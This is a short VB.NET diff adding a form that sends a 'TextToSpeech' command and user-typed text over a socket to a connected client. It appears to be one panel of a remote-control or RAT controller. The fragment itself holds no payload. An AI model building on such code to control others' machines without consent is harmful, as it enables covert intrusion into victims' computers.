@@ -1,0 +1,15 @@
+﻿Public Class Form13
+    Public sock As Integer
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+        Form1.s.Send(sock, "TextToSpeech" & Form1.yy & TextBox1.Text)
+    End Sub
+
+    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
+        Me.Close()
+    End Sub
+
+    Private Sub CyberTheme1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CyberTheme1.Click
+
+    End Sub
+End Class
